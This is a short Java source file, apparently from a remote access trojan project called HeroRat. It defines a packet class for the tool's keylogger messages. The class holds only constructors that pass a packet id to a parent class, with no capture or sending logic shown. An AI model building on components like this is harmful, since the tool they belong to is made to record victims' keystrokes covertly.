package net.herorat.network;

import java.io.DataInputStream;
import java.io.DataOutputStream;

public class Packet4Keylogger extends Packet
{	
	public Packet4Keylogger()
	{
		super(4);
	}

	public Packet4Keylogger(DataInputStream inputstream)
	{
		super(inputstream, 4);
	}
	
	public Packet4Keylogger(DataOutputStream outputstream, String[] objects)
	{
		super(outputstream, 4, objects);
	}
}